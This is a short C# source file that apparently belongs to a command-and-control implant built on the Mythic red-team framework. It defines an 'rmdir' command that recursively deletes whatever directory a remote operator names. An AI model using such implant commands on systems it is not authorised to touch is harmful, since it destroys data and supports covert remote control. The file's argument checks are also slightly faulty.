using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class DeleteDirectory : CerberusCommand
    {
        public override string Name => "rmdir";

        public override string Execute(MythicTask task)
        {
            var Arguments = task.parameters.Split(' ');
            if (Arguments is null || Arguments.Length == 0)
            {
                return "No path provided";
            }

            var path = Arguments[0];
            Directory.Delete(path, true);

            if (!Directory.Exists(path))
            {
                return $"{path} deleted";
            }

            return $"Failed to delete {path}";
        }
    }
}
